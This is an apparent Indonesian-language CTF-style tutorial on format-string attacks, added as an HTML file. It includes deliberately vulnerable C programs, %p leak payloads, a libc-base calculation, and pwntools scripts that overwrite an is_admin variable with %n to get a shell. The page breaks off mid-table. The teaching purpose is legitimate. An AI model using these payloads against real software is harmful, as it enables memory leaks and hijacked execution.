@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:sans-serif;color:#1a1a1a;padding:1rem;background:#fff;max-width:720px;margin:0 auto}
+h2{font-size:17px;font-weight:500;margin-bottom:6px}
+h3{font-size:14px;font-weight:500;margin-bottom:6px}
+p{font-size:13px;line-height:1.75;color:#555}
+.nav{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:1.25rem}
+.nav-btn{padding:6px 12px;border-radius:999px;border:0.5px solid #ccc;background:#fff;color:#555;font-size:11px;cursor:pointer;transition:all .15s}
+.nav-btn.active{background:#BA7517;color:#fff;border-color:#BA7517}
+.sec{display:none}.sec.active{display:block}
+.card{background:#fff;border:0.5px solid #ddd;border-radius:12px;padding:1rem 1.25rem;margin-bottom:.75rem}
+.soal-card{background:#FAEEDA;border:0.5px solid #FAC775;border-radius:12px;padding:1rem 1.25rem;margin-bottom:1.25rem}
+.step-nav{display:flex;align-items:center;gap:10px;margin-bottom:1rem}
+.step-dots{display:flex;gap:5px;flex:1;flex-wrap:wrap}
+.dot{width:9px;height:9px;border-radius:50%;background:#ccc;border:none;padding:0;cursor:pointer}
+.btn-nav{padding:6px 16px;border-radius:8px;border:0.5px solid #ccc;background:#fff;color:#1a1a1a;font-size:13px;cursor:pointer}
+.btn-nav:hover{background:#f5f5f5}
+.btn-next{background:#BA7517;color:#fff;border-color:#BA7517}
+.btn-next:hover{background:#854F0B}
+.step-label{font-size:12px;color:#999}
+.step-panel{display:none}.step-panel.active{display:block}
+.eq{font-family:monospace;background:#f5f5f5;border:0.5px solid #ddd;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block}
+.eq-hi{font-family:monospace;background:#FAEEDA;border:0.5px solid #FAC775;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#412402}
+.eq-ok{font-family:monospace;background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#173404}
+.eq-danger{font-family:monospace;background:#FCEBEB;border:0.5px solid #F09595;border-radius:6px;padding:.5rem 1rem;margin:.4rem 0;font-size:12px;line-height:1.9;display:block;color:#501313}
+.ok{background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#27500A;margin:.4rem 0}
+.warn{background:#FAEEDA;border:0.5px solid #FAC775;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#633806;margin:.4rem 0}
+.danger{background:#FCEBEB;border:0.5px solid #F09595;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#791F1F;margin:.4rem 0}
+.note{background:#EEEDFE;border:0.5px solid #AFA9EC;border-radius:8px;padding:.5rem .85rem;font-size:12px;color:#26215C;margin:.4rem 0}
+.step-title{font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#BA7517;margin-bottom:8px}
+.badge{display:inline-block;padding:2px 10px;border-radius:999px;font-size:11px;font-weight:500;margin-bottom:8px;background:#FAEEDA;color:#633806}
+.tbl{width:100%;border-collapse:collapse;font-size:12px;margin:.5rem 0}
+.tbl th{font-weight:500;text-align:left;padding:6px 10px;background:#f5f5f5;border:0.5px solid #ddd;color:#555}
+.tbl td{padding:6px 10px;border:0.5px solid #ddd;font-family:monospace;font-size:11px}
+.hi-row td{background:#FCEBEB;color:#791F1F}
+.ok-row td{background:#EAF3DE;color:#27500A}
+.warn-row td{background:#FAEEDA;color:#633806}
+.amber-row td{background:#FAEEDA;color:#412402}
+.big-ans{font-size:15px;font-weight:500;font-family:monospace;color:#BA7517}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:480px){.grid2{grid-content-columns:1fr}}
+.code-block{background:#1a1a2e;border-radius:8px;padding:.75rem 1rem;font-family:monospace;font-size:12px;color:#a8ff78;line-height:1.9;margin:.4rem 0;word-break:break-all}
+.cm{color:#555}.ck{color:#64b5f6}.cs{color:#ffd700}.cn{color:#f48fb1}
+.hi{background:#3d1a1a;color:#ff6b6b;border-radius:2px;padding:0 2px}
+.ok-hi{background:#1a3d1a;color:#a8ff78;border-radius:2px;padding:0 2px}
+.yl{color:#ffd700}.wh{color:#fff}.am{color:#EF9F27}
+.stack-cell{padding:5px 10px;border:0.5px solid #ddd;font-family:monospace;font-size:11px;border-radius:4px;margin:2px 0;display:flex;justify-content:space-between;align-items:center}
+.sc-plain{background:#f5f5f5;color:#1a1a1a}
+.sc-fmt{background:#FAEEDA;color:#633806;border-color:#FAC775}
+.sc-ptr{background:#EEEDFE;color:#3C3489;border-color:#AFA9EC;border-width:2px}
+.sc-ok{background:#EAF3DE;color:#27500A;border-color:#97C459}
+.sc-hi{background:#FCEBEB;color:#791F1F;border-color:#F09595;border-width:2px}
+.addr{font-size:10px;color:#888;font-family:monospace}
+.step-box{padding:.5rem .85rem;background:#f5f5f5;border-left:3px solid #BA7517;border-radius:0 6px 6px 0;font-size:12px;margin:.3rem 0;line-height:1.8}
+.fmt-spec{display:inline-block;padding:2px 8px;border-radius:4px;font-family:monospace;font-size:12px;font-weight:500}
+.fs-blue{background:#E6F1FB;color:#0C447C}
+.fs-red{background:#FCEBEB;color:#791F1F}
+.fs-green{background:#EAF3DE;color:#27500A}
+.fs-amber{background:#FAEEDA;color:#633806}
+.fs-purple{background:#EEEDFE;color:#3C3489}
+</style>
+</head>
+<body>
+
+<div style="margin-bottom:1rem">
+  <div class="badge">Binary Exploitation — Format String Attack</div>
+  <h2>Dari satu bug printf() → baca dan tulis memori sembarangan</h2>
+  <p style="margin-top:4px">Format String adalah bug paling powerful di binary exploitation — dengan satu kerentanan, attacker mendapat dua primitif sekaligus: <strong>arbitrary read</strong> (baca memori mana saja) dan <strong>arbitrary write</strong> (tulis ke memori mana saja). Tanpa overflow sama sekali.</p>
+</div>
+
+<div class="nav">
+  <button class="nav-btn active" onclick="showSec('konsep')">Konsep dasar</button>
+  <button class="nav-btn" onclick="showSec('read')">Soal 1: Read (leak)</button>
+  <button class="nav-btn" onclick="showSec('write')">Soal 2: Write (%n)</button>
+  <button class="nav-btn" onclick="showSec('got')">Soal 3: GOT overwrite</button>
+  <button class="nav-btn" onclick="showSec('ringkasan')">Ringkasan</button>
+</div>
+
+<!-- ============================================================ -->
+<!-- KONSEP -->
+<!-- ============================================================ -->
+<div id="sec-konsep" class="sec active">
+  <div class="card">
+    <div class="step-title">Fondasi — Bug format string terjadi di mana?</div>
+    <h3>Ketika input user langsung jadi format string</h3>
+    <div class="grid2" style="margin:.5rem 0">
+      <div style="padding:.6rem;background:#EAF3DE;border:0.5px solid #97C459;border-radius:8px">
+        <p style="font-size:11px;font-weight:500;color:#27500A;margin-bottom:4px">Kode AMAN</p>
+        <div class="code-block" style="font-size:11px;padding:.4rem .75rem">printf(<span class="cs">"%s"</span>, input);</div>
+        <p style="font-size:11px;color:#3B6D11">Format spec tetap, input hanya data</p>
+      </div>
+      <div style="padding:.6rem;background:#FCEBEB;border:0.5px solid #F09595;border-radius:8px">
+        <p style="font-size:11px;font-weight:500;color:#791F1F;margin-bottom:4px">Kode RENTAN</p>
+        <div class="code-block" style="font-size:11px;padding:.4rem .75rem">printf(input); <span class="cm">// BUG!</span></div>
+        <p style="font-size:11px;color:#A32D2D">Input langsung jadi format string!</p>
+      </div>
+    </div>
+    <p style="margin:.5rem 0">Juga rentan:</p>
+    <div class="code-block">
+sprintf(buf, input);     <span class="cm">// ← rentan</span>
+fprintf(file, input);    <span class="cm">// ← rentan</span>
+syslog(LOG_INFO, input); <span class="cm">// ← rentan</span>
+    </div>
+    <div class="danger">Kalau user bisa kontrol format string, ia bisa menyuntikkan specifier seperti %p, %x, %s, %n yang membaca/menulis stack!</div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Fondasi — Bagaimana printf() bekerja secara internal</div>
+    <h3>printf() membaca argumen dari stack berurutan</h3>
+    <p style="margin-bottom:.75rem">Saat <code>printf("%d %d %d", a, b, c)</code> dipanggil, stack terlihat seperti:</p>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell sc-plain"><span>c (arg ke-3)</span><span class="addr">esp+12</span></div>
+      <div class="stack-cell sc-plain"><span>b (arg ke-2)</span><span class="addr">esp+8</span></div>
+      <div class="stack-cell sc-plain"><span>a (arg ke-1)</span><span class="addr">esp+4</span></div>
+      <div class="stack-cell sc-fmt"><span>pointer ke format string "%d %d %d"</span><span class="addr">esp+0</span></div>
+    </div>
+    <p style="font-size:12px;margin:.5rem 0">Setiap <code>%d</code> membuat printf membaca nilai berikutnya dari stack. Kalau tidak ada argumen yang sesuai, printf tetap membaca — apapun yang ada di stack!</p>
+    <span class="eq">Input: printf("%d %d %d %d %d")  ← tidak ada argumen sama sekali!
+→ printf baca 5 nilai dari stack secara membabi buta
+→ nilai yang dibaca = isi stack yang "kebetulan" ada di sana</span>
+    <div class="ok">Inilah mengapa format string bisa baca semua isi stack — termasuk canary, return address, pointer ke libc, dll!</div>
+  </div>
+
+  <div class="card">
+    <div class="step-title">Fondasi — Format specifier yang dipakai dalam serangan</div>
+    <table class="tbl">
+      <tr><th>Specifier</th><th>Fungsi</th><th>Kegunaan dalam exploit</th></tr>
+      <tr><td><span class="fmt-spec fs-blue">%p</span></td><td>Print pointer (hex)</td><td>Leak alamat stack/heap/libc</td></tr>
+      <tr><td><span class="fmt-spec fs-blue">%x</span></td><td>Print hex 32-bit</td><td>Leak nilai di stack</td></tr>
+      <tr><td><span class="fmt-spec fs-red">%s</span></td><td>Print string dari pointer</td><td>Baca memori di alamat yang ditunjuk</td></tr>
+      <tr><td><span class="fmt-spec fs-red">%n</span></td><td>Tulis jumlah karakter yang sudah diprint</td><td>WRITE primitive — tulis nilai ke memori!</td></tr>
+      <tr><td><span class="fmt-spec fs-green">%Nc</span></td><td>Print N karakter</td><td>Kontrol jumlah byte untuk %n</td></tr>
+      <tr><td><span class="fmt-spec fs-amber">%K$p</span></td><td>Baca parameter ke-K langsung</td><td>Direct parameter access — akses posisi tertentu</td></tr>
+      <tr><td><span class="fmt-spec fs-purple">%hn</span></td><td>Tulis 2 byte (short)</td><td>Write 2 byte — lebih presisi untuk GOT overwrite</td></tr>
+    </table>
+    <div class="note" style="margin-top:.5rem"><strong>Kunci:</strong> <code>%K$p</code> berarti "baca parameter ke-K". Misal <code>%3$p</code> = baca parameter ketiga. Ini disebut <em>direct parameter access</em> — sangat berguna untuk menarget posisi tertentu di stack.</div>
+  </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- READ / LEAK -->
+<!-- ============================================================ -->
+<div id="sec-read" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#BA7517;margin-bottom:6px">Soal 1 — Format String Read (Leak)</div>
+  <h2 style="color:#412402">Temukan canary dan alamat libc dari stack!</h2>
+  <p style="color:#633806;margin-top:6px;margin-bottom:.75rem">Program berikut memiliki format string vulnerability. Gunakan untuk membaca stack dan temukan nilai canary serta alamat libc!</p>
+  <div class="code-block">
+<span class="ck">#include</span> <span class="cs">&lt;stdio.h&gt;</span>
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">64</span>];
+    printf(<span class="cs">"Masukkan nama: "</span>);
+    fgets(buf, <span class="cn">64</span>, stdin);
+    printf(buf);   <span class="cm">// ← FORMAT STRING BUG!</span>
+    printf(<span class="cs">"\nDone.\n"</span>);
+}
+<span class="ck">int</span> main() { vuln(); <span class="ck">return</span> <span class="cn">0</span>; }
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #FAC775;margin-top:.5rem">
+    <div style="color:#888;margin-bottom:4px">Skenario pengujian:</div>
+    <div>Input <span style="color:#BA7517">%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span> menghasilkan:</div>
+    <div style="margin-top:4px;color:#1a1a1a">0x1.(nil).0x804a000.0xbffff5c0.0xbffff5a8.<span style="color:#791F1F;font-weight:500">0xdeadbe00</span>.0xbffff634.0x80484f2.<span style="color:#27500A;font-weight:500">0xb7e52960</span>.0x0</div>
+    <div style="margin-top:6px;color:#888">Diketahui: canary selalu berakhiran \x00. Libc puts() offset dari libc base = 0x67360</div>
+  </div>
+  <p style="color:#633806;font-size:12px;margin-top:.5rem">Pertanyaan: (1) Di parameter ke berapa canary? (2) Di parameter ke berapa libc addr? (3) Hitung libc base!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="r1-prev" onclick="prevStep('r1')" disabled>Prev</button>
+  <div class="step-dots" id="r1-dots"></div>
+  <span class="step-label" id="r1-counter">1 / 6</span>
+  <button class="btn-nav btn-next" id="r1-next" onclick="nextStep('r1')">Next</button>
+</div>
+
+<!-- R1 STEP 0 -->
+<div class="step-panel active" id="r1-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Analisis output dari %p dump</div>
+    <h3>Baca nilai-nilai yang tercetak dan identifikasi tiap nilai</h3>
+    <p style="margin-bottom:.75rem">Input <code>%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code> mencetak 10 nilai dari stack. Mari kita analisis:</p>
+    <table class="tbl">
+      <tr><th>Param ke-</th><th>Nilai hex</th><th>Kemungkinan isi</th></tr>
+      <tr><td>1</td><td>0x1</td><td>Nilai integer kecil (argumen main atau flag)</td></tr>
+      <tr><td>2</td><td>(nil) = 0x0</td><td>NULL pointer</td></tr>
+      <tr><td>3</td><td>0x804a000</td><td>Alamat BSS/data segment (mulai 0x804xxxx = binary x86)</td></tr>
+      <tr><td>4</td><td>0xbffff5c0</td><td>Stack pointer — alamat stack</td></tr>
+      <tr><td>5</td><td>0xbffff5a8</td><td>Stack address — frame pointer atau local var</td></tr>
+      <tr class="hi-row"><td>6</td><td>0xdeadbe<strong>00</strong></td><td>CANARY! Diakhiri \x00 selalu ✓</td></tr>
+      <tr><td>7</td><td>0xbffff634</td><td>Stack address lain</td></tr>
+      <tr><td>8</td><td>0x80484f2</td><td>Return address ke binary (mulai 0x0804 = text segment)</td></tr>
+      <tr class="ok-row"><td>9</td><td>0xb7e52960</td><td>LIBC ADDRESS! Mulai 0xb7 = libc di x86 Linux ✓</td></tr>
+      <tr><td>10</td><td>0x0</td><td>NULL</td></tr>
+    </table>
+    <div class="ok" style="margin-top:.5rem">Canary = parameter ke-6, libc address = parameter ke-9!</div>
+  </div>
+</div>
+
+<!-- R1 STEP 1 -->
+<div class="step-panel" id="r1-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Verifikasi dengan direct parameter access</div>
+    <h3>Pakai %6$p dan %9$p untuk konfirmasi</h3>
+    <p style="margin-bottom:.75rem">Setelah tahu posisinya, gunakan direct access untuk membaca lebih bersih:</p>
+    <div class="code-block">
+<span class="cm"># Input untuk konfirmasi canary:</span>
+%6$p
+<span class="cm"># Output: 0xdeadbe00  ← canary!</span>
+
+<span class="cm"># Input untuk konfirmasi libc addr:</span>
+%9$p
+<span class="cm"># Output: 0xb7e52960  ← libc puts() atau fungsi libc lain</span>
+
+<span class="cm"># Bisa juga leak keduanya sekaligus:</span>
+%6$p.%9$p
+<span class="cm"># Output: 0xdeadbe00.0xb7e52960</span>
+    </div>
+    <div class="note"><code>%K$p</code> = baca parameter ke-K tanpa print yang lain. Jauh lebih efisien dari %p berulang!</div>
+  </div>
+</div>
+
+<!-- R1 STEP 2 -->
+<div class="step-panel" id="r1-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Hitung libc base dari libc address yang bocor</div>
+    <h3>libc_base = leaked_addr - offset_fungsi_dari_base</h3>
+    <p style="margin-bottom:.75rem">Kita tahu nilai yang bocor = <code>0xb7e52960</code>. Tapi fungsi apa ini? Dari soal, diketahui ini adalah puts() dan offset puts dari libc base = <code>0x67360</code>.</p>
+    <span class="eq">libc_base = leaked_addr - puts_offset
+libc_base = 0xb7e52960 - 0x67360
+libc_base = 0xb7deb600</span>
+    <p style="margin:.5rem 0;font-size:12px">Verifikasi: 0xb7deb600 + 0x67360 = 0xb7e52960 ✓</p>
+    <div class="ok" style="margin-top:.5rem">libc base = 0xb7deb600. Sekarang bisa hitung semua alamat fungsi lain di libc!</div>
+    <span class="eq-ok">system() = libc_base + system_offset
+         = 0xb7deb600 + 0x3a920
+         = 0xb7e25f20
+
+"/bin/sh" = libc_base + binsh_offset
+          = 0xb7deb600 + 0x15ba0b
+          = 0xb7f4700b</span>
+  </div>
+</div>
+
+<!-- R1 STEP 3 -->
+<div class="step-panel" id="r1-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Cara membaca string dari alamat sembarang</div>
+    <h3>%s membaca string dari pointer yang ada di stack</h3>
+    <p style="margin-bottom:.75rem">Selain %p, kita bisa pakai <code>%s</code> untuk membaca string dari alamat yang ditunjuk oleh nilai di stack. Ini lebih powerful — bisa baca konten memori, bukan hanya nilai angka.</p>
+    <span class="eq">Misalkan parameter ke-4 berisi 0xbffff5c0 (alamat stack)
+Input: %4$s
+→ printf membaca string dari alamat 0xbffff5c0
+→ mencetak isi memori di sana sebagai string!</span>
+    <div class="warn">Hati-hati: <code>%s</code> akan crash kalau pointer tidak valid atau menunjuk ke unmapped memory. Gunakan dengan hati-hati — cek dulu dengan <code>%p</code>.</div>
+    <div class="note" style="margin-top:.4rem">Teknik ini dipakai untuk membaca: isi variabel tersembunyi, konten file yang dimuat di memori, atau string sensitif seperti password yang ada di heap/stack.</div>
+  </div>
+</div>
+
+<!-- R1 STEP 4 -->
+<div class="step-panel" id="r1-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Script otomatis dengan pwntools</div>
+    <h3>Leak canary dan libc dalam satu script</h3>
+    <div class="code-block">
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+
+p = process(<span class="cs">'./vuln'</span>)
+
+<span class="cm"># Kirim format string untuk leak canary (param 6) dan libc (param 9)</span>
+p.recvuntil(<span class="cs">b'Masukkan nama: '</span>)
+p.sendline(<span class="cs">b'%6$p.%9$p'</span>)
+
+<span class="cm"># Parse output</span>
+line = p.recvline().strip()
+parts = line.split(<span class="cs">b'.'</span>)
+
+canary    = int(parts[<span class="cn">0</span>], <span class="cn">16</span>)
+puts_leak = int(parts[<span class="cn">1</span>], <span class="cn">16</span>)
+
+<span class="cm"># Hitung libc base</span>
+puts_offset = <span class="cn">0x67360</span>
+libc_base   = puts_leak - puts_offset
+
+<span class="cm"># Hitung target</span>
+system_addr = libc_base + <span class="cn">0x3a920</span>
+binsh_addr  = libc_base + <span class="cn">0x15ba0b</span>
+
+print(<span class="cs">f"[+] canary:    {hex(canary)}"</span>)
+print(<span class="cs">f"[+] libc base: {hex(libc_base)}"</span>)
+print(<span class="cs">f"[+] system():  {hex(system_addr)}"</span>)
+    </div>
+  </div>
+</div>
+
+<!-- R1 STEP 5 -->
+<div class="step-panel" id="r1-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Jawaban dan ringkasan</div>
+    <div style="text-align:center;padding:1.25rem;background:#f5f5f5;border-radius:12px;border:0.5px solid #ddd;margin-bottom:.75rem">
+      <div style="font-size:12px;color:#888;margin-bottom:6px">Jawaban soal</div>
+      <div class="big-ans">Canary = param ke-6 = 0xdeadbe00</div>
+      <div class="big-ans" style="margin-top:4px">libc addr = param ke-9 = 0xb7e52960</div>
+      <div class="big-ans" style="margin-top:4px">libc base = 0xb7deb600</div>
+    </div>
+    <div style="padding:.75rem 1rem;background:#f5f5f5;border-left:3px solid #BA7517">
+      <p style="font-size:12px;font-weight:500;margin-bottom:6px">Cara kerja Format String Read</p>
+      <p style="font-size:12px">1. Kirim banyak %p untuk dump seluruh stack</p>
+      <p style="font-size:12px">2. Identifikasi nilai: canary (diakhiri \x00), libc (mulai 0xb7 di x86), stack (0xbfff)</p>
+      <p style="font-size:12px">3. Pakai %K$p untuk direct access ke posisi yang diinginkan</p>
+      <p style="font-size:12px">4. Hitung offset: libc_base = leaked - known_offset</p>
+      <p style="font-size:12px">5. Pakai %K$s untuk baca string dari alamat yang ditunjuk parameter ke-K</p>
+    </div>
+  </div>
+</div>
+
+</div><!-- end read -->
+
+<!-- ============================================================ -->
+<!-- WRITE / %n -->
+<!-- ============================================================ -->
+<div id="sec-write" class="sec">
+<div class="soal-card">
+  <div style="font-size:11px;font-weight:500;text-transform:uppercase;letter-spacing:.07em;color:#BA7517;margin-bottom:6px">Soal 2 — Format String Write (%n)</div>
+  <h2 style="color:#412402">Ubah nilai variabel global tanpa overflow!</h2>
+  <p style="color:#633806;margin-top:6px;margin-bottom:.75rem">Program ini cek variabel <code>is_admin</code> untuk memberi akses. Gunakan <code>%n</code> untuk menulis ke variabel itu!</p>
+  <div class="code-block">
+<span class="ck">int</span> is_admin = <span class="cn">0</span>;   <span class="cm">// variabel global di 0x0804a018</span>
+
+<span class="ck">void</span> vuln() {
+    <span class="ck">char</span> buf[<span class="cn">128</span>];
+    fgets(buf, <span class="cn">128</span>, stdin);
+    printf(buf);     <span class="cm">// ← format string bug!</span>
+}
+
+<span class="ck">int</span> main() {
+    vuln();
+    <span class="ck">if</span> (is_admin) {
+        system(<span class="cs">"/bin/sh"</span>);
+    } <span class="ck">else</span> {
+        puts(<span class="cs">"Access denied."</span>);
+    }
+}
+  </div>
+  <div style="background:#fff;border-radius:8px;padding:.6rem .85rem;font-family:monospace;font-size:12px;border:0.5px solid #FAC775;margin-top:.5rem">
+    <div>is_admin ada di alamat: <span style="color:#BA7517">0x0804a018</span></div>
+    <div>Format string buf ada di parameter ke-: <span style="color:#791F1F">4</span> (dari eksperimen %p)</div>
+    <div>Proteksi: NO ASLR | NO PIE | NO NX | NO Canary</div>
+  </div>
+  <p style="color:#633806;font-size:12px;margin-top:.5rem">Pertanyaan: Susun format string untuk mengubah is_admin menjadi 1!</p>
+</div>
+
+<div class="step-nav">
+  <button class="btn-nav" id="w1-prev" onclick="prevStep('w1')" disabled>Prev</button>
+  <div class="step-dots" id="w1-dots"></div>
+  <span class="step-label" id="w1-counter">1 / 7</span>
+  <button class="btn-nav btn-next" id="w1-next" onclick="nextStep('w1')">Next</button>
+</div>
+
+<!-- W1 STEP 0 -->
+<div class="step-panel active" id="w1-step-0">
+  <div class="card">
+    <div class="step-title">Langkah 1 — Cara kerja %n</div>
+    <h3>%n menulis JUMLAH KARAKTER yang sudah diprint ke alamat pointer</h3>
+    <p style="margin-bottom:.75rem"><code>%n</code> adalah specifier khusus yang tidak mencetak — ia MENULIS jumlah karakter yang sudah tercetak sejauh ini ke alamat yang ditunjuk oleh argumen berikutnya.</p>
+    <div class="code-block">
+<span class="cm">// Contoh penggunaan normal %n:</span>
+<span class="ck">int</span> count;
+printf(<span class="cs">"Hello%n World"</span>, &amp;count);
+<span class="cm">// "Hello" = 5 karakter → count = 5</span>
+<span class="cm">// Lanjut print " World"</span>
+<span class="cm">// Output: "Hello World", count = 5</span>
+    </div>
+    <p style="margin:.5rem 0">Dalam format string attack:</p>
+    <span class="eq">Kita taruh ALAMAT TARGET di dalam format string itu sendiri
+(sebagai bagian dari input yang kita kirim)
+Lalu pakai %K$n untuk tulis ke alamat di parameter ke-K
+→ parameter ke-K akan menunjuk ke alamat target kita</span>
+    <div class="danger">%n menulis ke pointer — bukan ke nilai! Jadi kita perlu menaruh ALAMAT target di dalam format string, lalu %n akan menulis jumlah karakter ke alamat itu.</div>
+  </div>
+</div>
+
+<!-- W1 STEP 1 -->
+<div class="step-panel" id="w1-step-1">
+  <div class="card">
+    <div class="step-title">Langkah 2 — Prinsip write primitive</div>
+    <h3>Tiga langkah untuk menulis ke alamat sembarang</h3>
+    <div style="display:flex;flex-direction:column;gap:.4rem;margin:.5rem 0">
+      <div class="step-box">
+        <div style="font-weight:500;color:#BA7517;margin-bottom:3px">Langkah A: Taruh alamat target di format string</div>
+        <div style="color:#555">Format string adalah input kita → terletak di stack (dalam buf). Kita bisa memasukkan raw bytes alamat target sebagai bagian dari string.</div>
+      </div>
+      <div class="step-box">
+        <div style="font-weight:500;color:#BA7517;margin-bottom:3px">Langkah B: Cari di mana format string itu sendiri di stack</div>
+        <div style="color:#555">Karena buf ada di stack, format string yang kita tulis muncul sebagai parameter ke-N. Cari N dengan eksperimen.</div>
+      </div>
+      <div class="step-box">
+        <div style="font-weight:500;color:#BA7517;margin-bottom:3px">Langkah C: Pakai %N$n untuk tulis nilai ke alamat tadi</div>
+        <div style="color:#555">%N$n membaca parameter ke-N (= alamat yang kita taruh), lalu tulis jumlah karakter yang sudah diprint ke sana.</div>
+      </div>
+    </div>
+    <div class="note">Soal bilang format string (buf) ada di parameter ke-4. Artinya: 4 byte pertama buf akan terbaca sebagai parameter ke-4!</div>
+  </div>
+</div>
+
+<!-- W1 STEP 2 -->
+<div class="step-panel" id="w1-step-2">
+  <div class="card">
+    <div class="step-title">Langkah 3 — Struktur payload write</div>
+    <h3>Format: [alamat target][format spec untuk print N char][%K$n]</h3>
+    <p style="margin-bottom:.75rem">Kita ingin tulis nilai <strong>1</strong> ke <code>is_admin</code> di <code>0x0804a018</code>.</p>
+    <p style="font-size:12px;margin-bottom:.5rem">Rencana payload:</p>
+    <div style="display:flex;flex-direction:column;gap:2px;margin:.5rem 0">
+      <div class="stack-cell sc-ptr"><span>[4 byte: 0x0804a018 ← alamat is_admin]</span><span class="addr">buf[0..3]</span></div>
+      <div class="stack-cell sc-fmt"><span>%Nc (print N karakter supaya total = nilai target)</span><span class="addr">buf[4..]</span></div>
+      <div class="stack-cell sc-hi"><span>%4$n (tulis ke parameter ke-4 = alamat di buf[0..3])</span><span class="addr">akhir</span></div>
+    </div>
+    <span class="eq">Payload = [addr_target][padding untuk kontrol jumlah char][%K$n]
+
+Saat printf proses ini:
+1. Mencetak alamat 0x0804a018 sebagai data (4 byte)
+2. Padding menambah karakter yang tercetak
+3. %4$n membaca param ke-4 = 0x0804a018
+4. Menulis jumlah char yang sudah tercetak ke alamat 0x0804a018!</span>
+  </div>
+</div>
+
+<!-- W1 STEP 3 -->
+<div class="step-panel" id="w1-step-3">
+  <div class="card">
+    <div class="step-title">Langkah 4 — Hitung jumlah karakter untuk nilai target</div>
+    <h3>Kita ingin %n menulis nilai 1 ke is_admin</h3>
+    <p style="margin-bottom:.75rem">%n menulis BERAPA KARAKTER yang sudah tercetak. Kita ingin nilai = 1. Masalah: 4 byte alamat sudah dicetak dulu!</p>
+    <span class="eq">Karakter yang sudah tercetak sebelum %n:
+- 4 byte alamat (0x0804a018) = 4 karakter
+- Kita perlu total = 1? Tidak bisa! 4 sudah lebih dari 1.
+
+Solusi: target nilai yang lebih besar, misal:
+- Tulis 0x100 (256) agar is_admin != 0 (tetap true!)
+- Atau pakai nilai = 4 (sudah 4 karakter dari addr) ← mudah!</span>
+    <p style="margin:.5rem 0;font-size:12px">Strategi: tulis nilai 4 (sudah 4 karakter dari addr). is_admin = 4 → non-zero → dianggap true!</p>
+    <span class="eq-hi">Payload = [addr 0x0804a018][%4$n]
+= \x18\xa0\x04\x08 + "%4$n"
+
+4 karakter sudah tercetak (dari addr) saat %4$n → tulis 4 ke is_admin!
+is_admin = 4 → if(is_admin) = TRUE → shell!</span>
+  </div>
+</div>
+
+<!-- W1 STEP 4 -->
+<div class="step-panel" id="w1-step-4">
+  <div class="card">
+    <div class="step-title">Langkah 5 — Menulis nilai SPESIFIK dengan padding</div>
+    <h3>Kalau ingin is_admin = 0xdeadbeef, pakai padding</h3>
+    <p style="margin-bottom:.75rem">Kita bisa menulis nilai APAPUN dengan mengontrol jumlah karakter yang dicetak sebelum %n:</p>
+    <span class="eq">Mau tulis nilai V ke alamat A:
+1. Sudah ada N karakter dicetak sebelum %n
+2. Perlu cetak (V - N) karakter tambahan
+3. Pakai "%Xc" untuk cetak X karakter sekaligus
+
+Contoh: tulis 0x41 (65) ke is_admin
+- 4 byte alamat sudah dicetak (N=4)
+- Perlu total 65 karakter → tambah 65-4 = 61 karakter
+- Format: \x18\xa0\x04\x08 + "%61c" + "%4$n"</span>
+    <div class="code-block">
+<span class="ck">from</span> pwn <span class="ck">import</span> *
+
+p = process(<span class="cs">'./vuln'</span>)
+
+target_addr = <span class="cn">0x0804a018</span>  <span class="cm"># alamat is_admin</span>
+target_val  = <span class="cn">1</span>            <span class="cm"># nilai yang ingin ditulis</span>
+fmt_offset  = <span class="cn">4</span>            <span class="cm"># buf ada di param ke-4</span>
+
+<span class="cm"># Hitung padding: total_chars_needed - len(addr)</span>
+addr_bytes  = p32(target_addr)   <span class="cm"># 4 byte</span>
+padding_len = target_val - len(addr_bytes)
+
+<span class="cm"># Kalau target_val < 4, tambah 0x100 (masih non-zero!)</span>
+<span class="ck">if</span> padding_len &lt; <span class="cn">0</span>:
+    target_val += <span class="cn">0x100</span>
+    padding_len = target_val - len(addr_bytes)
+
+payload = addr_bytes
+payload += (<span class="cs">f"%{padding_len}c"</span>).encode()
+payload += (<span class="cs">f"%{fmt_offset}$n"</span>).encode()
+
+p.sendline(payload)
+p.interactive()  <span class="cm"># → shell!</span>
+    </div>
+  </div>
+</div>
+
+<!-- W1 STEP 5 -->
+<div class="step-panel" id="w1-step-5">
+  <div class="card">
+    <div class="step-title">Langkah 6 — Menulis nilai besar: %hn (2 byte) dan %hhn (1 byte)</div>
+    <h3>Tulis nilai besar dengan memecah jadi beberapa write</h3>
+    <p style="margin-bottom:.75rem">Menulis nilai besar seperti 0xdeadbeef membutuhkan mencetak 3,735,928,559 karakter — tidak praktis! Solusinya: pecah menjadi 2 atau 4 write terpisah.</p>
+    <table class="tbl">
